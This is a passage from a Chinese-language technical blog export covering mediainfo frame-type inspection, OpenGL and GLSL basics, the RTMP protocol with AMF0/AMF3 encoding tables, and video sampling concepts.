class="line">Bit rate                                 : 256 kb/s</span><br><span class="line">Channel(s)                               : 2 channels</span><br><span class="line">Channel layout                           : L R</span><br><span class="line">Sampling rate                            : 48.0 kHz</span><br><span class="line">Frame rate                               : 46.875 FPS (1024 SPF)</span><br><span class="line">Compression mode                         : Lossy</span><br><span class="line">Stream size                              : 1.86 MiB (2%)</span><br><span class="line">Default                                  : Yes</span><br><span class="line">Alternate group                          : 1</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="mediainfo-basic-2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mediainfo --Details 1.mp4 | grep &#x27;slice_type &#x27; | less</span><br><span class="line">000032B   slice_layer_without_partitioning (IDR) - 0 - Frame 0 - slice_type I - frame_num 0 - DTS 00:00:00.000 - PTS 00:00:00.017 - pic_order_cnt_lsb 0 (284642 bytes)</span><br><span class="line">0045DDD   slice_layer_without_partitioning (non-IDR) - 6 - Frame 1 - slice_type P - frame_num 1 - DTS 00:00:00.017 - pic_order_cnt_lsb 6 (31035 bytes)</span><br><span class="line">004D9D1   slice_layer_without_partitioning (non-IDR) - 2 - Frame 2 - slice_type B - frame_num 2 - DTS 00:00:00.033 - pic_order_cnt_lsb 2 (7852 bytes)</span><br><span class="line">004FB40   slice_layer_without_partitioning (non-IDR) - 4 - Frame 3 - slice_type B - frame_num 2 - DTS 00:00:00.050 - pic_order_cnt_lsb 4 (8833 bytes)</span><br><span class="line">005207E   slice_layer_without_partitioning (non-IDR) - 12 - Frame 4 - slice_type P - frame_num 2 - DTS 00:00:00.067 - pic_order_cnt_lsb 12 (35530 bytes)</span><br><span class="line">005AB54   slice_layer_without_partitioning (non-IDR) - 8 - Frame 5 - slice_type B - frame_num 3 - DTS 00:00:00.083 - pic_order_cnt_lsb 8 (10433 bytes)</span><br><span class="line">005D6C5   slice_layer_without_partitioning (non-IDR) - 10 - Frame 6 - slice_type B - frame_num 3 - DTS 00:00:00.100 - pic_order_cnt_lsb 10 (10786 bytes)</span><br><span class="line">006039E   slice_layer_without_partitioning (non-IDR) - 18 - Frame 7 - slice_type P - frame_num 3 - DTS 00:00:00.117 - pic_order_cnt_lsb 18 (35835 bytes</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="mediainfo-basic-3"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mediainfo --Details 1.mp4 | grep &#x27;slice_type I&#x27; | wc -l</span><br><span class="line">3</span><br><span class="line">$ mediainfo --Details 1.mp4 | grep &#x27;slice_type P&#x27; | wc -l</span><br><span class="line">171</span><br><span class="line">$ mediainfo --Details 1.mp4 | grep &#x27;slice_type B&#x27; | wc -l</span><br><span class="line">338</span><br></pre></td></tr></table></figure></div></div></div>

]]></content>
      <categories>
        <category>Media</category>
      </categories>
      <tags>
        <tag>mediainfo</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenGL基础</title>
    <url>/Media/OpenGL.html</url>
    <content><![CDATA[<p>OpenGL是个用来操作graphics和images的一系列API (Application Programming Interface)，是被<a href="https://www.khronos.org/">Khronos Group</a>维护的规范所定义。OpenGL规范只定义了这些API，并未提供其实现细节，通常由各显卡厂商在显卡驱动中实现。</p>
<span id="more"></span>

<h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><h2 id="Immediate-mode"><a href="#Immediate-mode" class="headerlink" title="Immediate-mode"></a>Immediate-mode</h2><p>OpenGL早期模式是Immediate-mode，多数功能因此在各种容易使用的库中，OpenGL计算过程对上层开发者来说是个黑盒：</p>
<ul>
<li>OpenGL 3.2 版本后被弃用</li>
<li>抽象层次高，灵活性不足，效率低</li>
</ul>
<h2 id="Core-profile"><a href="#Core-profile" class="headerlink" title="Core-profile"></a>Core-profile</h2><p>OpenGL core-profile是规范的一个分支，它去除了所有旧的已弃用的功能。</p>
<ul>
<li>OpenGL 3.3+ (推荐) 的接口更灵活，暴露更多底层细节</li>
</ul>
<h2 id="Extensions"><a href="#Extensions" class="headerlink" title="Extensions"></a>Extensions</h2><p>OpenGL规范支持自定义的扩展接口，使得厂商可以通过此方式发布新的渲染技术，而不必等待OpenGL发布新版本：</p>
<ul>
<li>流行或有用的扩展可能会成为未来OpenGL版本的一部分</li>
</ul>
<h2 id="State-machine"><a href="#State-machine" class="headerlink" title="State-machine"></a>State-machine</h2><p>OpenGL本身可看成一个很大的状态机：一个定义了OpenGL当前应该如何操作的变量集合。OpenGL状态被称为OpenGL上下文（context），使用OpenGL通常过程：</p>
<ul>
<li>改变状态：设置一些options到context</li>
<li>操作缓冲区：渲染过程是逐像素操作的，为双缓冲设计以避免割裂问题<ul>
<li>front缓冲区：包含窗口中显示的最终图像</li>
<li>back缓冲区：所有渲染命令绘制到的区域</li>
<li>所有渲染命令完成后，将back缓冲区交换到front缓冲区</li>
</ul>
</li>
<li>渲染：用当前context进行渲染</li>
</ul>
<h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>OpenGL规范中的Object指的是OpenGL状态子集中选项的集合，一个object在C实现中即为定义此对象的结构。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Define a object</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">object_name</span> &#123;</span></span><br><span class="line">    <span class="type">float</span>  option1;</span><br><span class="line">    <span class="type">int</span>    option2;</span><br><span class="line">    <span class="type">char</span>[] name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define State of OpenGL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">OpenGL_Context</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    object_name* object_Window_Target;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// General example to use object</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> objectId = <span class="number">0</span>;</span><br><span class="line">glGenObject(<span class="number">1</span>, &amp;objectId); <span class="comment">// create object (malloc gpu memory)</span></span><br><span class="line">glBindObject(GL_WINDOW_TARGET, objectId); <span class="comment">// bind object to context</span></span><br><span class="line">glSetObjectOption(GL_WINDOW_TARGET, GL_OPTION_WINDOW_WIDTH,  <span class="number">800</span>); <span class="comment">// set option of object</span></span><br><span class="line">glSetObjectOption(GL_WINDOW_TARGET, GL_OPTION_WINDOW_HEIGHT, <span class="number">600</span>); <span class="comment">// set option of object</span></span><br><span class="line">glBindObject(GL_WINDOW_TARGET, <span class="number">0</span>); <span class="comment">// set context target back to default</span></span><br><span class="line">glDeleteObject(<span class="number">1</span>, &amp;objectId); <span class="comment">// delete object (free gpu memory)</span></span><br></pre></td></tr></table></figure>

<h2 id="Viewport"><a href="#Viewport" class="headerlink" title="Viewport"></a>Viewport</h2><ul>
<li>OpenGL中的一切命令都在3D坐标中操作，将3D坐标转换为2D坐标后，在屏幕上显示<ol>
<li>OpenGL-3D坐标转换为OpenGL-2D坐标</li>
<li>OpenGL-2D坐标转换为系统视窗像素坐标</li>
</ol>
</li>
<li>OpenGL-2D坐标（忽略z轴）为：左上角(-1,1)、右下角（1，-1）</li>
<li>系统视窗坐标通常为：左上角(0,0)、右下角（window_width, window_hight）</li>
</ul>
<h3 id="NDC"><a href="#NDC" class="headerlink" title="NDC"></a>NDC</h3><p>Normalized Device Coordinates (NDC)</p>
<h2 id="Shader"><a href="#Shader" class="headerlink" title="Shader"></a>Shader</h2><p>着色器（shader)是在渲染过程（graphics pipeline）中运行在GPU上的程序，由GLSL (OpenGL Shading Language)语言定义，包含专门操作向量（vector）和矩阵（matrix）的有用功能。</p>
<img data-src="/images/Media/OpenGL-graphics-pipeline-base.png" class="" width="520" height="250" title="OpenGL graphics pipeline">

<ul>
<li>顶点数据（VertexData）：用顶点属性（VertexAttributes）表示，可以简化为包含3D坐标和颜色值</li>
<li>顶点列表（VertexData[]）：是包含3D坐标的顶点列表，每三个顶点构成一个三角形，作为渲染过程的输入数据</li>
<li>顶点着色器（VertexShader）：转换3D坐标后，对顶点属性做些处理</li>
<li>图元装配（PrimitiveAssembly）：从顶点着色器的输出中获取顶点，组装成三角形（primitive shape）</li>
<li>几何着色器（GeometryShader，可选）：从图元装配的输出中获取三角形（primitive），并生成新的顶点以形成新的三角形，从而整体形成新的形状</li>
<li>光栅化阶段（RasterizationStage）：将几何着色器的输出映射到屏幕上的相应像素中，从而产生供片段着色器使用的片段（fragment），会丢弃掉视图之外的所有片段，从而提高性能<ul>
<li>Fragment指渲染一个像素需要的所有数据</li>
</ul>
</li>
<li>片段着色器（FragmentShader）：是计算一个像素的最终颜色（灯光、阴影和光线的颜色），这通常是高级OpenGL效果发生的阶段</li>
<li>Alpha测试（AlphaTest）和混合（Blending）：alpha值定义了对象的不透明度，此阶段检查alpha值和片段的深度值，混合时用来判断当前片段在其他对象的前面还是后面，并相应丢弃</li>
</ul>
<h3 id="GLSL"><a href="#GLSL" class="headerlink" title="GLSL"></a>GLSL</h3><p>GLSL (OpenGL Shading Language)是C-like的语言：</p>
<ul>
<li>BasicType:<ul>
<li>float</li>
<li>double</li>
<li>int</li>
<li>uint</li>
<li>bool</li>
</ul>
</li>
<li>Vector (n&#x3D;2, 3, 4 -&gt; x, y, z, w):<ul>
<li>vecn: a vector of n floats (default)</li>
<li>bvecn: a vector of n booleans.</li>
<li>ivecn: a vector of n integers.</li>
<li>uvecn: a vector of n unsigned integers.</li>
<li>dvecn: a vector of n double components.<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vec2 someVec;</span><br><span class="line">vec4 differentVec = someVec.xyxx;</span><br><span class="line">vec3 anotherVec = differentVec.zyw;</span><br><span class="line">vec4 otherVec = someVec.xxxx + anotherVec.yxzy;</span><br><span class="line"></span><br><span class="line">vec2 vect = vec2(0.5, 0.7);</span><br><span class="line">vec4 result = vec4(vect, 0.0, 0.0);</span><br><span class="line">vec4 otherResult = vec4(result.xyz, 1.0);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>Input&amp;Output:<ul>
<li>in: declare a input variable</li>
<li>out: declare a output variable</li>
</ul>
</li>
<li>Uniform:<ul>
<li>uniform: declare global variable in shader program<ul>
<li><code>glUniform + f</code>: the function expects a float as its value.</li>
<li><code>glUniform + i</code>: the function expects an int as its value.</li>
<li><code>glUniform + ui</code>: the function expects an unsigned int as its value.</li>
<li><code>glUniform + 3f</code>: the function expects 3 floats as its value.</li>
<li><code>glUniform + fv</code>: the function expects a float vector&#x2F;array as its value.</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="shader"><ul class="nav-tabs"><li class="tab active"><a href="#shader-1">VertexShader</a></li><li class="tab"><a href="#shader-2">FragmentShader</a></li><li class="tab"><a href="#shader-3">FragmentShader-Uniform</a></li></ul><div class="tab-content"><div class="tab-pane active" id="shader-1"><figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// VertexShader的输入是CPU上的顶点数据，location用于标识这些顶点数据的布局</span></span><br><span class="line"><span class="comment">// （可以在CPU上通过location指定布局，以配置这些顶点属性）</span></span><br><span class="line"><span class="meta">#version 330 core</span></span><br><span class="line"><span class="keyword">layout</span> (<span class="keyword">location</span> = <span class="number">0</span>) <span class="keyword">in</span> <span class="type">vec3</span> aPos;   <span class="comment">// the position variable has attribute position 0</span></span><br><span class="line"><span class="keyword">layout</span> (<span class="keyword">location</span> = <span class="number">1</span>) <span class="keyword">in</span> <span class="type">vec3</span> aColor; <span class="comment">// the color variable has attribute position 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">out</span> <span class="type">vec3</span> ourColor; <span class="comment">// output a color to the fragment shader</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">gl_Position</span> = <span class="type">vec4</span>(aPos, <span class="number">1.0</span>);</span><br><span class="line">    ourColor = aColor; <span class="comment">// set ourColor to the input color we got from the vertex data</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="shader-2"><figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GLSL中颜色组件（RGBA）：red, green, blue and alpha (opacity)，取值范围为[0.0, 1.0]</span></span><br><span class="line"><span class="comment">// （前一阶段VertexShader的输出变量ourColor自动关联为FragmentShader的输入变量 -- 同名同类型）</span></span><br><span class="line"><span class="meta">#version 330 core</span></span><br><span class="line"><span class="keyword">out</span> <span class="type">vec4</span> FragColor;</span><br><span class="line"><span class="keyword">in</span> <span class="type">vec3</span> ourColor; <span class="comment">// input variable from the vertex shader (same name and same type)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    FragColor = <span class="type">vec4</span>(ourColor, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="shader-3"><figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line"><span class="meta">#version 330 core</span></span><br><span class="line"><span class="keyword">out</span> <span class="type">vec4</span> FragColor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uniform</span> <span class="type">vec4</span> ourColor; <span class="comment">// we set this variable in the OpenGL code.</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    FragColor = ourColor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set ourColor in c code</span></span><br><span class="line"><span class="type">float</span> timeValue = glfwGetTime();</span><br><span class="line"><span class="type">float</span> greenValue = (<span class="built_in">sin</span>(timeValue) / <span class="number">2.0</span>f) + <span class="number">0.5</span>f;</span><br><span class="line"><span class="type">int</span> vertexColorLocation = glGetUniformLocation(shaderProgram, &quot;ourColor&quot;);</span><br><span class="line">glUseProgram(shaderProgram);</span><br><span class="line">glUniform4f(vertexColorLocation, <span class="number">0.0</span>f, greenValue, <span class="number">0.0</span>f, <span class="number">1.0</span>f);</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Texture"><a href="#Texture" class="headerlink" title="Texture"></a>Texture</h2><h1 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h1><ul>
<li><a href="https://www.mesa3d.org/">The Mesa 3D Graphics Library</a>是OpenGL规范的开源C实现</li>
<li><a href="https://www.glfw.org/">GLFW</a>提供了创建GUI窗口、OpenGL上下文，接收输入和各种系统事件的能力（OS相关）</li>
<li><a href="https://glad.dav1d.de/">GLAD</a>提供了动态加载OpenGL库，并从中获取函数指针的过程（OS相关）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glxinfo  显示OpenGL信息（X windows）</span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://learnopengl.com/">Learn OpenGL</a></p>
]]></content>
      <categories>
        <category>Media</category>
      </categories>
      <tags>
        <tag>OpenGL</tag>
      </tags>
  </entry>
  <entry>
    <title>RTMP协议</title>
    <url>/Media/RTMP.html</url>
    <content><![CDATA[<p>RTMP (Real-Time Messaging Protocol) 最初被 Macromedia(2005 年被 Adobe 收购) 开发，作为一种私有协议用于在 Flash 播放器和服务器间双向传输音视频流，Adobe 在2009年部分开源了此协议。</p>
<span id="more"></span>

<p><a href="https://www.adobe.com/content/dam/acom/en/devnet/rtmp/pdf/rtmp_specification_1.0.pdf">Adobe’s Real Time Messaging Protocol (2012)</a></p>
<h1 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h1><ul>
<li>支持编码：<ul>
<li><strong>Audio</strong>: AAC, AAC-LC, HE-AAC+ v1&amp;v2, MP3, Opus, Speex</li>
<li><strong>Video</strong>: H.264, VP8, VP6, ScreenVideo_v1&amp;v2</li>
</ul>
</li>
<li>优势：<ul>
<li>持久化连接（persistent connections）：默认 TCP&#x2F;1935 端口</li>
<li>低延迟通信（low-latency communication）：最小缓冲（minimal buffering），通常5秒左右延迟</li>
<li>支持平滑传输（smooth streaming）：将流（stream）切分为片段（fragment，默认audio&#x2F;64B，video&#x2F;128B，可动态协商）</li>
<li>支持多路复用（multiplexed）：多条流（stream）可以在同一个连接上交错传输。通常为包层级交错（packet-interleaved）而非片段层级（fragment-interleaved）。</li>
<li>支持推流与拉流</li>
</ul>
</li>
<li>劣势：<ul>
<li>浏览器不再支持flash控件后，rtmp流必须经过转码后才能在浏览器播放。</li>
</ul>
</li>
</ul>
<h1 id="交互流程"><a href="#交互流程" class="headerlink" title="交互流程"></a>交互流程</h1><p>Stream<br>Chunk<br>Packet<br>fragment:<br>channel:</p>
<ul>
<li>6次握手</li>
<li>建立连接</li>
<li>推流</li>
<li>拉流</li>
<li>基于一些虚拟通道（virtual channels）传输包数据：<ul>
<li>channel: RPC 请求和应答 (基于 AMF - Action Message Format 定义消息体)；</li>
<li>channel: video 流；</li>
<li>channel: audio 流；</li>
<li>channel: 控制消息（例如片段大小协商）。</li>
</ul>
</li>
</ul>
<h1 id="协议依赖"><a href="#协议依赖" class="headerlink" title="协议依赖"></a>协议依赖</h1><h2 id="AMF协议"><a href="#AMF协议" class="headerlink" title="AMF协议"></a>AMF协议</h2><p><a href="https://www.rfc-editor.org/rfc/rfc2234.html">Augmented BNF for Syntax Specifications: ABNF (1997)</a><br><a href="https://www.adobe.com/content/dam/acom/en/devnet/pdf/amf0-file-format-specification.pdf">Action Message Format – AMF0 (2007)</a><br><a href="https://www.adobe.com/content/dam/acom/en/devnet/pdf/amf-file-format-spec.pdf">Action Message Format – AMF0 (2013)</a><br><a href="https://www.binaryconvert.com/convert_double.html">Online Binary Convert (IEEE754 Double precision 64-bit)</a></p>
<div class="tabs" id="amf"><ul class="nav-tabs"><li class="tab active"><a href="#amf-1">AMF0</a></li><li class="tab"><a href="#amf-2">AMF3</a></li></ul><div class="tab-content"><div class="tab-pane active" id="amf-1"><ul>
<li>一种紧凑的二进制格式，字符串采用UTF8编码；</li>
<li>一个字节标识数据类型：<ul>
<li>0x00 <strong>Number</strong> (64bit双精度浮点数，网络字节序)</li>
<li>0x01 <strong>Boolean</strong> (8bit无符号数，0x00:false; !0x00:true)</li>
<li>0x02 <strong>String</strong> (16bit字符串长度，后跟UTF-8编码的字符串)</li>
<li>0x03 <strong>Object</strong> (键值对的集合)</li>
<li>0x05 <strong>Null</strong></li>
<li>0x08 <strong>ECMA Array</strong> (32-bit entry count)</li>
<li>0x09 <strong>Object End</strong> (16bit空字符串长度作为前缀)</li>
<li>0x0a <strong>Strict Array</strong> (32-bit entry count)</li>
<li>0x0b <strong>Date</strong> (64bit双精度浮点数，带有16bit整数时区偏移)</li>
<li>0x0c <strong>Long String</strong> (32bit字符串长度，后跟UTF-8编码的字符串)</li>
<li>0x0f <strong>XML Document</strong> (32bit字符串长度，后跟UTF-8编码的字符串)</li>
<li>0x10 <strong>Typed Object</strong> (16bit的UTF-8编码的名字长度，后跟条目)</li>
<li>0x11 <strong>Switch to AMF3</strong></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transmission Control Protocol, Src Port: 1935, Dst Port: 36722, Seq: 3528, Ack: 3442, Len: 399</span><br><span class="line">Real Time Messaging Protocol (AMF0 Data onMetaData())</span><br><span class="line">    RTMP Header</span><br><span class="line">        00.. .... = Format: 0</span><br><span class="line">        ..00 0101 = Chunk Stream ID: 5            05</span><br><span class="line">        Timestamp: 0                              000000</span><br><span class="line">        Body size: 387                            000183</span><br><span class="line">        Type ID: AMF0 Data (0x12)                 12</span><br><span class="line">        Stream ID: 1                              01000000    4个字节的小端格式</span><br><span class="line">    RTMP Body</span><br><span class="line">        String &#x27;onMetaData&#x27;</span><br><span class="line">                                                                              STRING</span><br><span class="line">            AMF0 type: String (0x02)                                              02</span><br><span class="line">            String length: 10                     000a</span><br><span class="line">            String: onMetaData                    6f6e4d65746144617461</span><br><span class="line">        Object (14 items)</span><br><span class="line">                                                                              OBJECT</span><br><span class="line">            AMF0 type: Object (0x03)                                              03</span><br><span class="line">                                                  LEN  KEY                    STRING 46B  N G I N</span><br><span class="line">            Property &#x27;Server&#x27; String &#x27;NGINX RTMP&#x27; 0006 536572766572               02 002e 4e47494e...</span><br><span class="line">                                                  LEN  KEY                    NUMBER (IEEE754 Double precision 64-bit)</span><br><span class="line">            Property &#x27;width&#x27; Number 1920          0005 7769647468                 00 409e000000000000</span><br><span class="line">            Property &#x27;height&#x27; Number 1080         0006 686569676874               00 4090e00000000000</span><br><span class="line">            Property &#x27;displayWidth&#x27; Number 1920   000c 646973706c61795769647468   00 409e000000000000</span><br><span class="line">            Property &#x27;displayHeight&#x27; Number 1080  000d 646973706c6179486569676874 00 4090e00000000000</span><br><span class="line">            Property &#x27;duration&#x27; Number 0          0008 6475726174696f6e           00 0000000000000000</span><br><span class="line">            Property &#x27;framerate&#x27; Number 60        0009 6672616d6572617465         00 404e000000000000</span><br><span class="line">            Property &#x27;fps&#x27; Number 60              0003 667073                     00 404e000000000000</span><br><span class="line">            Property &#x27;videodatarate&#x27; Number 3907  000d 766964656f6461746172617465 00 40ae860000000000</span><br><span class="line">            Property &#x27;videocodecid&#x27; Number 7      000c 766964656f636f6465636964   00 401c000000000000</span><br><span class="line">            Property &#x27;audiodatarate&#x27; Number 156   000d 617564696f6461746172617465 00 4063800000000000</span><br><span class="line">            Property &#x27;audiocodecid&#x27; Number 10     000c 617564696f636f6465636964   00 4024000000000000</span><br><span class="line">            Property &#x27;profile&#x27; String &#x27;&#x27;          0007 70726f66696c65             02 0020 00000000...</span><br><span class="line">            Property &#x27;level&#x27; String &#x27;&#x27;            0005 6c6576656c                 02 0020 00000000...</span><br><span class="line">                                                  LEN                     OBJECT-END</span><br><span class="line">            End Of Object Marker                  0000                            09</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="amf-2"><ul>
<li>提高了二进制压缩率，支持更复杂的数据类型；</li>
<li>一个字节标识数据类型：<ul>
<li>0x00 <strong>Undefined</strong></li>
<li>0x01 <strong>Null</strong></li>
<li>0x02 <strong>Boolean False</strong></li>
<li>0x03 <strong>Boolean True</strong></li>
<li>0x04 <strong>Integer</strong> (8+bit可扩展长度的整数)</li>
<li>0x05 <strong>Double</strong> (64bit双精度浮点数)</li>
<li>0x06 <strong>String</strong> (8+bit可扩展长度的整数，后跟UTF-8编码的字符串)</li>
<li>0x07 <strong>XMLDocument</strong> (8+bit可扩展长度的整数，后跟UTF-8编码的字符串)</li>
<li>0x08 <strong>Date</strong> (8+bit可扩展长度的整数，带有64bit双精度浮点UTC偏移时间)</li>
<li>0x09 <strong>Array</strong> (8+bit可扩展长度的条目数)</li>
<li>0x0A <strong>Object</strong> (8+bit可扩展长度的条目数)</li>
<li>0x0B <strong>XML</strong> (8+bit可扩展长度的整数标志)</li>
<li>0x0C <strong>ByteArray</strong> (8+bit可扩展长度的整数标志，具有可选的8位字节长度)</li>
<li>0x0D <strong>VectorInt</strong></li>
<li>0x0E <strong>VectorUInt</strong></li>
<li>0x0F <strong>VectorDouble</strong></li>
<li>0x10 <strong>VectorObject</strong></li>
<li>0x11 <strong>Dictionary</strong></li>
</ul>
</li>
</ul></div></div></div>

<h1 id="协议变体"><a href="#协议变体" class="headerlink" title="协议变体"></a>协议变体</h1><h2 id="RTMPT-tunneled-through-HTTP"><a href="#RTMPT-tunneled-through-HTTP" class="headerlink" title="RTMPT (tunneled through HTTP)"></a>RTMPT (tunneled through HTTP)</h2><h2 id="RTMPS-encrypted-over-SSL"><a href="#RTMPS-encrypted-over-SSL" class="headerlink" title="RTMPS (encrypted over SSL)"></a>RTMPS (encrypted over SSL)</h2><h2 id="RTMPE-encrypted-over-Adobe"><a href="#RTMPE-encrypted-over-Adobe" class="headerlink" title="RTMPE (encrypted over Adobe)"></a>RTMPE (encrypted over Adobe)</h2><h2 id="RTMFP-travels-over-UDP-instead-of-TCP"><a href="#RTMFP-travels-over-UDP-instead-of-TCP" class="headerlink" title="RTMFP (travels over UDP instead of TCP)"></a>RTMFP (travels over UDP instead of TCP)</h2><h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="red5-java"><a href="#red5-java" class="headerlink" title="red5 (java)"></a>red5 (java)</h2><h2 id="SRS-C"><a href="#SRS-C" class="headerlink" title="SRS (C++)"></a>SRS (C++)</h2><h2 id="NGINX-rtmp-C"><a href="#NGINX-rtmp-C" class="headerlink" title="NGINX-rtmp (C++)"></a>NGINX-rtmp (C++)</h2><h2 id="librtmp"><a href="#librtmp" class="headerlink" title="librtmp"></a>librtmp</h2><h2 id="rtmpdump"><a href="#rtmpdump" class="headerlink" title="rtmpdump"></a>rtmpdump</h2><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://www.wowza.com/blog/rtmp-streaming-real-time-messaging-protocol">RTMP Streaming: The Real-Time Messaging Protocol Explained</a></li>
<li><a href="https://www.wowza.com/blog/streaming-protocols">Streaming Protocols: Everything You Need to Know</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc8216.html">HTTP Live Streaming - HLS (2017)</a></li>
</ul>
]]></content>
      <categories>
        <category>Media</category>
      </categories>
      <tags>
        <tag>RTMP</tag>
      </tags>
  </entry>
  <entry>
    <title>视频基础</title>
    <url>/Media/VideoBasic.html</url>
    <content><![CDATA[<p>视频常见概念梳理。</p>
<span id="more"></span>

<h1 id="视频数据"><a href="#视频数据" class="headerlink" title="视频数据"></a>视频数据</h1><ul>
<li>视频是一系列连续静止的图像快速切换产生的</li>
</ul>
<pre class="mermaid">
graph LR
Y0 -.- Y1 -.- Y2 -.- Y4 &amp; CR3 &amp; CG3 &amp; CB3
Y0 -.- |add| C1 -.- C2 -.- CR3 &amp; CG3 &amp; CB3 &amp; PB4 &amp; PR4
S0 -.- S1 -.- S2
CR3 -.- CR5
CG3 -.- CG5
CB3 -.- CB5
Y4 -.- Y6
PB4 -.- CB6
PR4 -.- CR6

subgraph G0[模拟黑白]
  Y0(灰度Y)
  S0(一路信号)
end

subgraph G1[模拟彩色-NTSC&#x2F;PAL&#x2F;SECAM]
  Y1(灰度Y)
  C1(色度R&#x2F;G)
  S1(一路复合信号)
end

subgraph G2[模拟S-Video]
  Y2(灰度Y)
  C2(色度C)
  S2(两路信号)
end

subgraph G3[模拟RGB]
  CR3(红R)
  CG3(绿G)
  CB3(蓝B)
end

subgraph G4[模拟YPbPr]
  Y4(灰度Y)
  PB4(蓝光与灰度差异Pb)
  PR4(红光与灰度差异Pr)
end

subgraph G5[数字RGB]
  CR5(红R)
  CG5(绿G)
  CB5(蓝B)
end

subgraph G6[数字YCbCr]
  Y6(灰度Y)
  CB6(蓝光与灰度差异Cb)
  CR6(红光与灰度差异Cr)
end
</pre>

<h1 id="视频采样"><a href="#视频采样" class="headerlink" title="视频采样"></a>视频采样</h1><p>将模拟信号量化为数字信号的过程。</p>
<h2 id="空间上"><a href="#空间上" class="headerlink" title="空间上"></a>空间上</h2><p>每张图像由采样点组成，采样点的数量决定图像质量，每个采样点可以用像素（pixel）表示。</p>
<h3 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h3><ul>
<li>视频分辨率（resolution）：<ul>
<li>1920x1080分别指在16:9的宽高比下水平采样和垂直扫描线的数目</li>
<li>对模拟视频信号进行采样时，频率越高水平采样数目越大，既线分辨率（lines of resolution）越大</li>
<li>视频质量通常用线分辨率来度量，与垂直扫描线无关</li>
</ul>
</li>
<li>清晰度（definition）：<ul>
<li>每个定义涉及多个因素<ul>
<li>显示宽高比（DAR, display aspect ratio）</li>
<li>像素宽高比（PAR, pixel aspect ratio或SAR，sample aspect ratio）</li>
<li>渐进&#x2F;交错采样</li>
<li>模拟消隐量（NAB, nominal analog blanking，一般左右两边各8个像素宽，用于标识水平采样的开始和结束，不会实际显示出来）</li>
</ul>
</li>
<li>480p(720x480) 是在DAR&#x3D;4:3，PAR&#x3D;10:11，NAB&#x3D;8时的逐行显示，480i指隔行显示<ul>
<li>720 &#x3D; 480 * (4&#x2F;3) &#x2F; (10&#x2F;11) + (8 * 2)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="时间上"><a href="#时间上" class="headerlink" title="时间上"></a>时间上</h2><p>视频中的运动图像是在周期性的时间间隔内对信号进行采样形成的，高帧率会使得运动中的场景越平滑。当使用渐进采样的视频在隔行显示器上播放时，需要先转换为交错采样，反之亦然。</p>
<h3 id="渐进"><a href="#渐进" class="headerlink" title="渐进"></a>渐进</h3><p>渐进采样（progressive sampling）时按顺序传输一张图像中的每一行。</p>
<h3 id="交错"><a href="#交错" class="headerlink" title="交错"></a>交错</h3><p>交错采样（interlaced sampling）：每张图像分成两个场（field），分别只包含奇数（odd）行和偶数（even）行的数据</p>
<ul>
<li>顶场（top field）：第一行为交错帧（interlaced frame）的第一行</li>
<li>低场（bottom field）：第一行为交错帧（interlaced frame）的第二行</li>
</ul>
<p><a href="/Media/FFmpeg#idet"><strong>探测采样类型ffmpeg&#x2F;filter&#x2F;idet</strong></a><br><a href="/Media/FFmpeg#tinterlace"><strong>转换交错模式ffmpeg&#x2F;filter&#x2F;tinterlace</strong></a></p>
<h3 id="帧率"><a href="#帧率" class="headerlink" title="帧率"></a>帧率</h3><p>帧率（frame rate）影响视频的流畅程度，帧率越大越流畅。例如同等码率下，每秒50场的交错采样要比每秒25帧的渐进采样更流畅。</p>
<h1 id="颜色空间"><a href="#颜色空间" class="headerlink" title="颜色空间"></a>颜色空间</h1><p>颜色空间（colour space）是一种可以再现亮度（brightness, luminance or luma）和色彩（colour）的方法。</p>
